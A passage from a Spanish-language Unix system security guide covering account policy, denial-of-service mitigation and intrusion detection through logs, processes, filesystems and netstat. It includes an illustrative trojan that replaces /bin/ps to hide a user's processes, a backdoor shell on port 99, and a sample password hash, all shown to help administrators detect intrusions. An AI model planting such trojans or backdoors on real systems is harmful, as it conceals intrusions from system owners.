&#x00A0;for&#x00A0;i&#x00A0;in&#x00A0;&#x2018;cat&#x00A0;/etc/passwd&#x00A0;|awk&#x00A0;-F:&#x00A0;&#x2019;{print&#x00A0;$6}&#x2019;&#x2018;;&#x00A0;do
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cd&#x00A0;$i
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;-f&#x00A0;.rhosts&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;$i/.rhosts&#x00A0;detectado&#x0022;|mail&#x00A0;-s&#x00A0;&#x0022;rhosts&#x0022;&#x00A0;root
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rm&#x00A0;-f&#x00A0;$i/.rhosts
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;done
</literallayout>
<!--l. 306--><para>Este programa env&#x02CA;&#x0131;a un correo al root en caso de encontrar un &#xFB01;chero .rhosts, y lo elimina; podemos
plani&#xFB01;carlo mediante cron para que se ejecute, por ejemplo, cada cinco minutos. La forma de plani&#xFB01;carlo
depende del clon de Unix en el que trabajemos, por lo que se recomienda consultar la p&#x00E1;gina del manual de
cron o crond; en el caso de Solaris, para que se ejecute cada vez que cron despierte, y suponiendo que el
script se llame /usr/local/sbin/busca, pondr&#x02CA;&#x0131;amos en nuestro crontab (con crontab -e) una l&#x02CA;&#x0131;nea
como

     </para><literallayout role="verbatim">
&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/local/sbin/busca&#x00A0;2&#x003E;&#x0026;1&#x00A0;&#x003E;/dev/null
</literallayout>
<!--l. 321--><para>Hemos de estar atentos a la carga que este tipo de actividades peri&#x00F3;dicas puede introducir en el sistema; la
orden anterior se va a ejecutar cada vez que cron despierta, generalmente una vez por minuto, lo que
implica que en m&#x00E1;quinas con un gran n&#x00FA;mero de usuarios puede introducir un factor importante de
operaciones de I/O. Una soluci&#x00F3;n m&#x00E1;s adecuada en estas situaciones ser&#x02CA;&#x0131;a plani&#xFB01;car el programa para
que se ejecute cada cinco o diez minutos, o el tiempo que estimemos necesario en nuestro
equipo.
Pol&#x02CA;&#x0131;tica de cuentas
<!--br/-->Muchos clones de Unix se instalan con cuentas consideradas &#x2018;del sistema&#x2019;, es decir, que no
corresponden a ning&#x00FA;n usuario concreto sino que existen por cuestiones de compatibilidad o para la
correcta ejecuci&#x00F3;n de algunos programas. Algunas de estas cuentas no tienen contrase~na, o tienen
una conocida por todo el mundo, por lo que representan una grave amenaza a la seguridad:
hemos de deshabilitarlas para evitar que alguien pueda conectar a nuestro equipo mediante
ellas. Algunos ejemplos de este tipo de cuentas son guest, demo, uucp, games, 4DGifts o
lp.
<!--br/-->Para deshabilitar una cuenta, en Unix no tenemos m&#x00E1;s que insertar un asterisco en el campo passwd en la
l&#x02CA;&#x0131;nea correspondiente del &#xFB01;chero de claves (generalmente /etc/passwd o
<!--br/-->/etc/shadow). De esta forma, una entrada como

     </para><literallayout role="verbatim">
&#x00A0;toni:7atzxSJlPVVaQ:1001:10:Toni&#x00A0;Villalon:/export/home/toni:/bin/sh
</literallayout>
<!--l. 349--><para>pasar&#x02CA;&#x0131;a a convertirse en

     </para><literallayout role="verbatim">
&#x00A0;toni:*7atzxSJlPVVaQ:1001:10:Toni&#x00A0;Villalon:/export/home/toni:/bin/sh
</literallayout>
<!--l. 357--><para>Aparte de este tipo de cuentas, hemos de tener un especial cuidado con las cuentas de usuario que no tienen
contrase~na o que tienen una clave d&#x00E9;bil; para detectar este &#x00FA;ltimo problema podemos utilizar programas
adivinadores como Crack, mientras que para evitarlo podemos utilizar NPasswd o Passwd+, adem&#x00E1;s
de sistemas Shadow Password para que los usuarios no puedan leer las claves cifradas. Para
detectar cuentas sin contrase~na (aunque tambi&#x00E9;n Crack nos las indicar&#x00E1;), podemos utilizar la
siguiente orden, obviamente sustituyendo /etc/passwd por el &#xFB01;chero de claves de nuestro
sistema:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$2==&#x0022;&#x0022;&#x00A0;{print&#x00A0;$1}&#x2019;&#x00A0;/etc/passwd
</literallayout>
<!--l. 373--><para>Por &#x00FA;ltimo, hay que decir que una correcta pol&#x02CA;&#x0131;tica de cuentas pasa por deshabilitar la entrada de usuarios
que no utilicen el sistema en un tiempo prudencial; por ejemplo, podemos cancelar las cuentas de usuarios
que no hayan conectado a la m&#x00E1;quina en los &#x00FA;ltimos dos meses, ya que son &#xFB01;rmes candidatas a que un
pirata las aproveche para atacarnos; la orden finger nos puede ayudar a detectar este tipo de
usuarios.
Negaciones de servicio
<!--br/-->Un tipo de ataque que ni siquiera suele necesitar de un acceso al sistema es el conocido como la
negaci&#x00F3;n de servicio (Denial of Service). Consiste b&#x00E1;sicamente en perjudicar total o parcialmente la
disponibilidad de un recurso, por ejemplo utilizando grandes cantidades de CPU, ocupando
toda la memoria del sistema o incluso deteniendo una m&#x00E1;quina. Obviamente las negaciones
de servicio m&#x00E1;s peligrosas son las que detienen el sistema o alguno de sus servicios de forma
remota:
<!--br/-->Las paradas de m&#x00E1;quina son, por norma general, fruto de un fallo en la implementaci&#x00F3;n de red del n&#x00FA;cleo: por
ejemplo, la llegada de un paquete con una cabecera extra~na, de una longitud determinada, o con una
cierta prioridad, puede llegar a detener la m&#x00E1;quina si ese paquete no se trata correctamente en la
implementaci&#x00F3;n del sistema de red. La mejor forma de prevenir estos ataques (que no suelen dejar ning&#x00FA;n
rastro en los &#xFB01;cheros de log) es actualizar el n&#x00FA;cleo de nuestro Unix peri&#x00F3;dicamente, manteniendo siempre la
&#x00FA;ltima versi&#x00F3;n estable.
<!--br/-->En el caso de la detenci&#x00F3;n de servicios determinados, habitualmente los ofrecidos desde inetd, la negaci&#x00F3;n de
servicio suele ser fruto de un excesivo n&#x00FA;mero de peticiones &#x2018;falsas&#x2019; al demonio correspondiente; por
ejemplo, un atacante enmascara su direcci&#x00F3;n IP para sobrecargar de peticiones un demonio como
in.telnetd hasta detenerlo. Para evitar estos ataques podemos incrementar el n&#x00FA;mero de
peticiones simult&#x00E1;neas que un demonio acepta (en la opci&#x00F3;n wait de la l&#x02CA;&#x0131;nea correspondiente en el
&#xFB01;chero /etc/inetd.conf), aunque esto tambi&#x00E9;n implica peligros de negaci&#x00F3;n de servicio (puede
aumentar demasiado el tiempo de respuesta del equipo); una forma mucho m&#x00E1;s recomendable de
actuar no es prevenir estos ataques sino minimizar sus efectos: si enviamos una se~nal
SIGHUP al demonio inetd &#x00E9;ste relee su con&#xFB01;guraci&#x00F3;n, por lo que el servicio bloqueado vuelve a
funcionar <anchor 
   id="x1-343002f2"  ></anchor><footnote><para>     Obviamente, las conexiones ya establecidas no se pierden.</para></footnote>.
Por tanto, es recomendable enviar una de estas se~nales de forma autom&#x00E1;tica cada cierto tiempo; podemos
plani&#xFB01;car esta acci&#x00F3;n para que cron la ejecute cada vez que despierte, incluyendo en nuestro archivo
crontab una l&#x02CA;&#x0131;nea como la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/bin/pkill&#x00A0;-HUP&#x00A0;inetd&#x00A0;2&#x003E;&#x0026;1&#x00A0;&#x003E;/dev/null
</literallayout>
<!--l. 421--><para>
  </para></section><!--end section--><!--l. 421--><section 
role="section"><title><abbrev role="title-mark">A.2</abbrev><anchor 
   id="x1-344000A.2"  ></anchor>Detecci&#x00F3;n</title>
<!--l. 422--><para>  La mayor&#x02CA;&#x0131;a de problemas de seguridad en sistemas de I+D implican accesos no autorizados, bien por
usuarios externos a la m&#x00E1;quina o bien por usuarios internos que consiguen un privilegio mayor del que
tienen asignado. &#x00BF;C&#x00F3;mo detectar estos problemas? Hacer esto puede ser algo muy complicado si el atacante
es un pirata con cierta experiencia y no hemos tomado algunas medidas en nuestro sistema antes de que el
ataque se produzca. Aqu&#x02CA;&#x0131; se presentan unos mecanismos que pueden indicar que alguien ha accedido
ilegalmente a nuestro equipo.
     </para><itemizedlist>
     <listitem>
     <!--l. 431--><para>Logs
     <!--br/-->Casi cualquier actividad dentro del sistema es susceptible de ser monitorizada en mayor o menor
     medida. Unix ofrece un estupendo sistema de logs que guarda informaci&#x00F3;n en &#xFB01;cheros
     contenidos generalmente en /var/adm/, /var/log/ o /usr/adm/; esta informaci&#x00F3;n var&#x02CA;&#x0131;a desde
     los usuarios que han conectado al sistema &#x00FA;ltimamente hasta los mensajes de error del
     n&#x00FA;cleo, y puede ser consultada con &#x00F3;rdenes como who o last, o con un simple editor de
     textos.
     <!--br/-->Aunque un atacante que consiga privilegios de root en el equipo puede modi&#xFB01;car (&#x00A1;o borrar!) estos
     archivos <anchor 
   id="x1-344001f3"  ></anchor><footnote><para>     O cualquier usuario con permiso de escritura en ellos; los usuarios ni siquiera han de tener permiso de lectura
en la mayor&#x02CA;&#x0131;a de los &#xFB01;cheros de log.</para></footnote>,
     los logs son con frecuencia el primer indicador de un acceso no autorizado o de un intento del mismo.
     Dependiendo de nuestra con&#xFB01;guraci&#x00F3;n (/etc/syslog.conf), pero generalmente en los archivos
     messages o syslog, podemos ver mensajes que pueden indicar un ataque al sistema; a continuaci&#x00F3;n
     se presentan algunos de ellos:
          </para><itemizedlist>
          <listitem>
          <!--l. 450--><para>Nov 12 05:35:42 anita in.telnetd[516]: refused connect from bg.microsoft.com
          <!--br/-->Este mensaje (conexi&#x00F3;n rehusada a un servicio) en sistemas con TCP-Wrappers instalado
          indica  que  alguien  ha  intentado  conectar  a  nuestro  equipo  desde  una  m&#x00E1;quina  no
          autorizada a hacerlo.
          </para></listitem>
          <listitem>
          <!--l. 457--><para>Nov 7 23:06:22 anita in.telnetd[2557]: connect from localhost
          <!--br/-->Alguien ha conectado con &#x00E9;xito a nuestro equipo desde una determinada m&#x00E1;quina; no
          implica que haya accedido con una nombre de usuario y su contrase~na, simplemente que
          ha tenido posibilidad de hacerlo.
          </para></listitem>
          <listitem>
          <!--l. 464--><para>SU 11/17 03:12 - pts/3 toni-root
          <!--br/-->El usuario toni ha intentado conseguir privilegios de administrador mediante la orden
          su; si lo hubiera conseguido, en lugar de un signo &#x2018;-&#x2019; aparecer&#x02CA;&#x0131;a un &#x2018;+&#x2019;. En Solaris,
          esto se registra en el &#xFB01;chero sulog, aunque en el &#xFB01;chero messages se noti&#xFB01;ca si el su ha
          fallado.</para></listitem></itemizedlist>

     </listitem>
     <listitem>
     <!--l. 474--><para>Procesos
     <!--br/-->Si un atacante ha conseguido acceso a nuestro equipo, y dependiendo de sus intenciones, es probable
     que ejecute programas en el sistema que permanecen en la tabla de procesos durante un largo
     periodo de tiempo; t&#x02CA;&#x0131;picos ejemplos son sni&#xFB00;ers (programas para capturar tr&#x00E1;&#xFB01;co de red) o bouncers
     (programas para ocultar una direcci&#x00F3;n en IRC). Debemos descon&#xFB01;ar de procesos que presenten un
     tiempo de ejecuci&#x00F3;n elevado, especialmente si no es lo habitual en nuestro sistema. Incluso si el
     nombre del proceso no es nada extra~no (obviamente un pirata no va a llamar a su analizador de
     tr&#x00E1;&#xFB01;co sniffer, sino que le dar&#x00E1; un nombre que no levante sospechas, como xzip o ltelnet)
     es muy conveniente que nos preocupemos de comprobar cu&#x00E1;l es el programa que se est&#x00E1;
     ejecutando.
     <!--br/-->Algo que nos puede ayudar mucho en esta tarea es la herramienta de seguridad lsof, que nos indica
     los &#xFB01;cheros abiertos por cada proceso de nuestro sistema, ya que programas como los sni&#xFB00;ers o
     los crackers de claves suelen mantener archivos abiertos para almacenar la informaci&#x00F3;n
     generada.
     </para></listitem>
     <listitem>
     <!--l. 490--><para>Sistemas de &#xFB01;cheros
     <!--br/-->Otro punto que puede denotar actividades sospechosas en la m&#x00E1;quina es su sistema de
     &#xFB01;cheros:
     <!--br/-->Por un lado, hemos de estar atentos al n&#x00FA;mero de archivos setuidados en el sistema: es frecuente que
     un pirata que ha conseguido privilegios de root guarde archivos con este bit activo para
     volver a conseguir esos privilegios de una forma m&#x00E1;s sencilla (por ejemplo, una copia
     de un shell setuidado como root dar&#x00E1; privilegios de administrador a cualquiera que lo
     ejecute).
     <!--br/-->Adem&#x00E1;s, los intrusos suelen crear directorios &#x2018;dif&#x02CA;&#x0131;ciles&#x2019; de localizar, donde poder guardar herramientas
     de ataque: por ejemplo, si alguien es capaz de crear el directorio /dev/.../, seguramente cuando el
     administrador haga un listado de /dev/ ni se dar&#x00E1; cuenta de la existencia de un directorio con un
     nombre tan poco com&#x00FA;n como &#x2018;...&#x2019;.
     <!--br/-->Otra actividad relacionada con el sistema de &#xFB01;cheros es la sustituci&#x00F3;n de ciertos programas
     que puedan delatar una presencia extra~na, como ps, who o last, o programas cr&#x02CA;&#x0131;ticos
     como /bin/login por versiones &#x2018;troyanizadas&#x2019; que no muestren nada relacionado con el
     atacante; por ejemplo, alguien podr&#x02CA;&#x0131;a sustituir el programa /bin/login por otro que
     aparentemente se comporte igual, pero que al recibir un nombre de usuario concreto
     otorgue acceso al sistema sin necesidad de clave. Un ejemplo muy simple de este tipo de
     troyanos es el siguiente: alguien mueve el archivo /bin/ps a /bin/OLDps y a continuaci&#x00F3;n
     ejecuta

          </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;&#x003E;/bin/ps
&#x00A0;#!/bin/sh
&#x00A0;/bin/OLDps&#x00A0;$1|grep&#x00A0;-v&#x00A0;&#x2019;&#x02C6;&#x00A0;&#x00A0;&#x00A0;&#x00A0;toni&#x2019;|grep&#x00A0;-v&#x00A0;grep|grep&#x00A0;-v&#x00A0;OLD
&#x00A0;&#x02C6;D
&#x00A0;anita:~#
</literallayout>
     <!--l. 524--><para>A partir de ahora, cuando alguien teclee ps -ef no ver&#x00E1; los procesos del usuario toni. Se puede seguir un mecanismo
     similar <anchor 
   id="x1-344002f4"  ></anchor><footnote><para>     Realmente el mecanismo suele ser m&#x00E1;s elaborado; aqu&#x02CA;&#x0131; se ha utilizado una forma muy simple de ocultaci&#x00F3;n &#x00FA;nicamente a
modo de ejemplo.</para></footnote>
     con programas como w, finger, last, who o ls para conseguir ocultar a un usuario conectado, sus
     procesos, sus &#xFB01;cheros&#x2026;
     <!--br/-->Otro s&#x02CA;&#x0131;ntoma que denota la presencia de un problema de seguridad puede ser la modi&#xFB01;caci&#x00F3;n
     de ciertos &#xFB01;cheros importantes del sistema; por ejemplo, un atacante puede modi&#xFB01;car
     /etc/syslog.conf para que no se registren ciertos mensajes en los archivos de log, o
     /etc/exports para exportar directorios de nuestro equipo. El problema de este estilo m&#x00E1;s
     frecuente es la generaci&#x00F3;n de nuevas entradas en el &#xFB01;chero de claves con UID 0 (lo que implica
     un total privilegio); para detectar este tipo de entradas, se puede utilizar la siguiente
     orden:

          </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$3==&#x0022;0&#x0022;&#x00A0;{print&#x00A0;$1}&#x2019;&#x00A0;/etc/passwd
&#x00A0;root
&#x00A0;anita:~#
</literallayout>
     <!--l. 547--><para>Obviamente, si como salida de la orden anterior obtenemos alg&#x00FA;n otro nombre de usuario, aparte del
     root, ser&#x02CA;&#x0131;a conveniente cancelar la cuenta de ese usuario e investigar por qu&#x00E9; aparece con UID
     0.
     <!--br/-->Detectar este tipo de problemas con el sistema de &#xFB01;cheros de nuestro equipo puede ser una tarea
     complicada; la soluci&#x00F3;n m&#x00E1;s r&#x00E1;pida pasa por instalar Tripwire, comentado en este mismo
     punto.
     </para></listitem>
     <listitem>
     <!--l. 553--><para>Directorios de usuarios
     <!--br/-->Dentro del sistema de &#xFB01;cheros existen unos directorios especialmente con&#xFB02;ictivos: se trata de los
     $HOME de los usuarios. La con&#xFB02;ictividad de estos directorios radica principalmente en que es la zona
     m&#x00E1;s importante del sistema de archivos donde los usuarios van a tener permiso de escritura, por lo
     que su control (por ejemplo, utilizando Tripwire) es a priori m&#x00E1;s dif&#x02CA;&#x0131;cil que el de directorios cuyo
     contenido no cambie tan frecuentemente. Algunos elementos dentro de estos directorios que pueden
     denotar una intrusi&#x00F3;n son los siguientes:
          </para><itemizedlist>
          <listitem>
          <!--l. 563--><para>Hemos de chequear el grupo y propietario de cada archivo para comprobar que no pertenecen a
          usuarios privilegiados en lugar de a usuarios normales, o a grupos especiales en lugar de a
          grupos gen&#x00E9;ricos (users, staff&#x2026;). Por ejemplo, si el padre de los directorios de usuario es
          /export/home/, podemos buscar dentro de &#x00E9;l &#xFB01;cheros que pertenezcan al administrador con la
          orden

              </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;find&#x00A0;/export/home/&#x00A0;-user&#x00A0;root&#x00A0;-type&#x00A0;f&#x00A0;-print
</literallayout>
          </listitem>
          <listitem>
          <!--l. 576--><para>&#x00BF;Hay archivos setuidados o setgidados en los directorios de usuario? No deber&#x02CA;&#x0131;a, por lo que su
          existencia es algo bastante sospechoso&#x2026;
          </para></listitem>
          <listitem>
          <!--l. 578--><para>La existencia de c&#x00F3;digo fuente, generalmente C, de exploits (programas que aprovechan un fallo
          de seguridad en el software para utilizarlo en bene&#xFB01;cio del atacante) puede ser indicativo de
          una contrase~na robada, o de un usuario intentando conseguir un privilegio mayor en el sistema.
          &#x00BF;C&#x00F3;mo saber si un c&#x00F3;digo es un exploit o una pr&#x00E1;ctica de un alumno? La respuesta es
          obvia: ley&#x00E9;ndolo. &#x00BF;Y si se trata de &#xFB01;cheros ejecutables en lugar de c&#x00F3;digo fuente? man
          strings.</para></listitem></itemizedlist>
     </listitem>
     <listitem>
     <!--l. 587--><para>El sistema de red
     <!--br/-->Estar atentos al sistema de red de nuestro equipo tambi&#x00E9;n nos puede proporcionar indicios
     de accesos no autorizados o de otro tipo de ataques contra el sistema. Por ejemplo, si
     utilizamos netstat para comprobar las conexiones activas, y detectamos una entrada similar
     a

          </para><literallayout role="verbatim">
&#x00A0;anita.telnet&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;luisa.2039&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;16060&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;10136&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
</literallayout>
     <!--l. 599--><para>esto indica que desde el host luisa alguien est&#x00E1; conectado a nuestro sistema mediante telnet; puede
     haber accedido o no (si ha tecleado un nombre de usuario y la contrase~na correcta), pero el hecho es
     que la conexi&#x00F3;n est&#x00E1; establecida.
     <!--br/-->Otro m&#x00E9;todo muy seguido por los piratas es asegurar la reentrada al sistema en caso de ser
     descubiertos, por ejemplo instalando un programa que espere conexiones en un cierto puerto y que
     proporcione un shell sin necesidad de login y password (o con los mismos predeterminados); por
     ejemplo, si el programa espera peticiones en el puerto 99, el atacante puede acceder al sistema con
     un simple telnet:

          </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;anita&#x00A0;99
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;Sun&#x00A0;Microsystems&#x00A0;Inc.&#x00A0;&#x00A0;&#x00A0;SunOS&#x00A0;5.7&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Generic&#x00A0;October&#x00A0;1998
&#x00A0;anita:~#
</literallayout>
     <!--l. 622--><para>Podemos detectar los puertos que esperan una conexi&#x00F3;n en nuestro sistema tambi&#x00E9;n con la orden
     netstat:

          </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;netstat&#x00A0;-P&#x00A0;tcp&#x00A0;-f&#x00A0;inet&#x00A0;-a|grep&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.sunrpc&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32771&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.telnet&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.finger&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.dtspc&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.lockd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.smtp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.8888&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32772&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32773&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
